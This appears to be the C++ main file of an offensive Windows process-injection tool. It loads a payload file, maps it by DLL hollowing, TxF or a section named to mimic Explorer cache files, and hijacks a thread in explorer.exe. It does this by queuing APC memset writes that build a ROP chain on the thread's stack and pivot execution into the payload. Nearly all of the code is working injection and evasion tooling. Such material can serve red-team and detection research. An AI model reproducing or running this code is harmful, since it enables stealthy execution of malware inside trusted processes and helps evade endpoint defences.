
#include "helper.h"
#include "buildrop.h"
#include "hollowdll.h"


int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {

	std::vector<std::wstring> Args(&pArgv[0], &pArgv[0 + nArgc]);
	HMODULE	hSelfModule = GetModuleHandleA(nullptr);

	if (nArgc < 3) {
		HRSRC hResourceInfo;
		HGLOBAL hResourceData;
		char* pRsrcData = nullptr;
		uint32_t dwRsrcSize;

		if ((hResourceInfo = FindResourceA(hSelfModule, "IDR_USAGE_TEXT", (LPCSTR)RT_RCDATA))) {
			if ((hResourceData = LoadResource(hSelfModule, hResourceInfo))) {
				dwRsrcSize = SizeofResource(hSelfModule, hResourceInfo);
				pRsrcData = (char*)LockResource(hResourceData);
				std::unique_ptr<uint8_t[]> RsrcBuf = std::make_unique<uint8_t[]>(dwRsrcSize + 1); // Otherwise the resource text may bleed in to the rest of the .rsrc section
				memcpy(RsrcBuf.get(), pRsrcData, dwRsrcSize);
				printf("%s\r\n", pRsrcData);
				system("Pause");
			}
		}
	}

	bool bTxF = true;

	std::wstring PayloadFilePath;
	int32_t alloc_type = -1;
	int32_t exec_method = -1;
	int32_t dwTargetTid = -1;
	bool unmap_after_exec = false;
	bool vp_to_rx = false;

	for (std::vector<std::wstring>::const_iterator ItrArg = Args.begin(); ItrArg != Args.end(); ++ItrArg) {
		std::wstring Arg = *ItrArg;
		transform(Arg.begin(), Arg.end(), Arg.begin(), ::tolower);

		if (Arg == L"--alloc-type") {
			if (*(ItrArg + 1) == L"dll-map-hollow") {
				alloc_type = 0;
				bTxF = false;
			}
			else if (*(ItrArg + 1) == L"txf-dll-map-hollow") {
				alloc_type = 1;
				bTxF = true;
			}
			else if (*(ItrArg + 1) == L"mapped") {
				alloc_type = 2;
			}
		}
		else if (Arg == L"--exec-method") {
			if (*(ItrArg + 1) == L"call") {
				exec_method = 0;
			}
			else if (*(ItrArg + 1) == L"create-thread") {
				exec_method = 1;
			}
			else if (*(ItrArg + 1) == L"create-thread-stealthy") {
				exec_method = 2;
			}
		}
		else if (Arg == L"--target-tid") {
			dwTargetTid = _wtoi((*(ItrArg + 1)).c_str());
		}
		else if (Arg == L"--RWX-to-RX") {
			vp_to_rx = true;
		}
		else if (Arg == L"--payload-file") {
			PayloadFilePath = *(ItrArg + 1);
		}
		else if (Arg == L"--unmap-after-exec") {
			unmap_after_exec = true;
		}
	}

	if (alloc_type == -1) {
		alloc_type = 2;
		printf("No allocation type specified - using \"mapped\"\r\n");
	}

	if (exec_method == -1) {
		exec_method = 0;
		printf("No exec type specified - using \"same thread\"\r\n");
	}

	if (dwTargetTid == -1) {
		printf("No target TID specified - targeting Explorer.exe thread w/ start address Explorer.exe+0x8b110\r\n");
	}
	else {
		printf("Targeting user specified TID - the thread must be alertable");
	}

	if (exec_method == 2) {
		if (dwTargetTid == -1) {
			printf("Cannot target Explorer.exe w/ option \"create-thread-stealthy\" - CFG will cause Explorer to crash\r\n");
			return 0;
		}
	}

	if (vp_to_rx) {
		printf("RWX memory will be VirtualProtected to RX - note that dynamically self-decrypting payloads cannot be executed from RX memory");
	}

	if (alloc_type == 1) {
		vp_to_rx = true;
	}

	if (PayloadFilePath.empty()) {
		printf("Must specify a payload path\r\n");
		return 0;
	}


	bool is_image_backed = false;


	HANDLE hFile = INVALID_HANDLE_VALUE;
	uint32_t dwFileSize = 0;
	uint8_t* pFileBuf = nullptr;
	uint32_t dwBytesRead;

	if ((hFile = CreateFileW(PayloadFilePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr)) != INVALID_HANDLE_VALUE) {
		dwFileSize = GetFileSize(hFile, nullptr);
		pFileBuf = new uint8_t[dwFileSize];
		printf("... successfully opened payload file %ws (size: %d)\r\n", PayloadFilePath.c_str(), dwFileSize);
		ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr);
	}
	else {
		printf("... failed to open %ws (error %d)\r\n", PayloadFilePath.c_str(), GetLastError());
		return 0;
	}

	if (bTxF && NtCreateTransaction == nullptr) {
		bTxF = false;
		printf("- TxF is not handled on this system. Changing alloc_type to \"dll-map-hollow\".\r\n");
	}

	uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
	uint64_t qwMapBufSize;
	uint8_t* prMapBuf = nullptr, * prMappedCode = nullptr;

	if (alloc_type == 0 || alloc_type == 1) {
		if (alloc_type == 0) {
			printf("Locating suitable image for dll-map-hollow...\r\n");
		}
		else {
			printf("Locating suitable image for txf-dll-map-hollow...\r\n");
		}
		HollowDLL(&pMapBuf, &qwMapBufSize, (uint8_t*)pFileBuf, dwFileSize, &pMappedCode, &prMapBuf, &prMappedCode, 0, bTxF, vp_to_rx);
		is_image_backed = true;
	}
	else {
		//do the standard mapping
		HANDLE hSection = nullptr;
		NTSTATUS NtStatus;
		LARGE_INTEGER max_size;
		max_size.QuadPart = dwFileSize + 4000;

		OBJECT_ATTRIBUTES LocalAttributes;
		UNICODE_STRING szName;
		

		// Section name: "C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db" (name similar to sections commonly loaded by Explorer)
		RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db");
		InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
		NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);

		qwMapBufSize = 0;
		NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)&pMapBuf, 0, 0, nullptr, (PSIZE_T)&qwMapBufSize, 1, 0, PAGE_EXECUTE_READWRITE);
		uint32_t dwOldProtect = 0;
		memcpy(pMapBuf, pFileBuf, dwFileSize); // this is where we could do the XOR thing
		if (vp_to_rx) {
			VirtualProtect(pMapBuf, qwMapBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect);
		}
	}

	HANDLE t = nullptr;
	if (dwTargetTid != -1) {
		t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, (DWORD)dwTargetTid);
	}
	else {
		//grab the proper explorer TID programmatcially
		// First need to grab explorer PID
		DWORD epid;
		std::wstring target_process = stringToWstring("explorer.exe");
		epid = getPID(target_process);

		// then can get start address of Explorer.exe image, so we can obtain the address of Explorer.exe+0x8b110 
		DWORD64 target_thread_addr;
		HMODULE hMods[1024];
		DWORD cbNeeded;
		unsigned int i;
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
			PROCESS_VM_READ,
			FALSE, epid);
		const TCHAR* explorerStr = TEXT("C:\\Windows\\Explorer.exe");
		if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
		{
			for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
			{
				TCHAR szModName[MAX_PATH];

				// Get the full path to the module's file.

				if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
					sizeof(szModName) / sizeof(TCHAR)))
				{
					// Check if it matches explorer
					if (_tcscmp(szModName, explorerStr) != 0) {
						target_thread_addr = (DWORD64)(hMods[i]) + 569616; //Explorer.exe+0x8b110 (KB4586781)
						break;
					}
					//printf("%s (0x%08X)\n", szModName, hMods[i]);
				}
			}
		}

		// then can get the start addresses of each thread to find the proper target
		std::vector<DWORD64> ex_tids = EnumThreads(L"explorer.exe");
		for (i = 0; i < sizeof(ex_tids); i++) {
			HANDLE tt = OpenThread(THREAD_QUERY_INFORMATION, FALSE, ex_tids[i]);
			DWORD64 thread_start = NULL;
			DWORD return_length = 0;
			NTSTATUS NtStatus;
			NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
			NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, "NtQueryInformationThread");
			NtStatus = NtQueryInformationThread(tt, 9, &thread_start, sizeof(thread_start), &return_length);
			if ((DWORD64)thread_start == target_thread_addr) {
				CloseHandle(tt);
				dwTargetTid = ex_tids[i];
				t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, dwTargetTid);
				break;
			}
		}
	}

	printf("Targeting thread ID %d\r\n", dwTargetTid);
	printf("Suspending thread\r\n");
	SuspendThread(t);

	CONTEXT context;
	TStrDWORD64Map runtime_parameters;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(t, &context))
	{
		printf("GetThreadContext failed with error 0x%08x\r\n", GetLastError());
		return 0;
	}

	runtime_parameters["orig_tos"] = (DWORD64)context.Rsp;
	runtime_parameters["tos"] = runtime_parameters["orig_tos"] - 0x2000;

	HMODULE ntdll = GetModuleHandleA("ntdll");
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	printf("Building ROP chain...\r\n");
	payload_output = BuildROPChain(runtime_parameters, qwMapBufSize, is_image_backed, exec_method, unmap_after_exec, vp_to_rx); //map size, is_image_backed, exec option, unmap option
	TStrDWORD64Map& tMetadata = *payload_output->metadata;

	DWORD64 orig_tos = tMetadata["orig_tos"];
	DWORD64 tos = tMetadata["tos"];
	DWORD64 rop_pos = tMetadata["rop_pos"];
	DWORD64* ROP_chain = (DWORD64*)payload_output->buffer;
	DWORD64 saved_return_address = tMetadata["saved_return_address"];
	DWORD64 GADGET_pivot = tMetadata["GADGET_pivot"];

	printf("Beginning stack bomb\r\n");

	NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, __int64)) GetProcAddress(ntdll, "NtQueueApcThread");

	// Grow the stack to accommodate the new stack
	for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i), (void*)0, 1);
	}

	// Write the new stack
	for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*)*(((BYTE*)ROP_chain) + i), 1);
	}
	// Save the original return address into the new stack
	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(ROP_chain[saved_return_address]), (void*)orig_tos, 8);

	// overwrite the original return address with GADGET_pivot
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
	}
	// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	for (int i = 0; i < sizeof(tos); i++)
	{
		(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);
	}

	printf("Resuming thread - payload should execute!");
	ResumeThread(t);
	Sleep(10000); //if we don't sleep, the only handle to the payload section may get closed before the target thread can obtain it
	return 0;
}





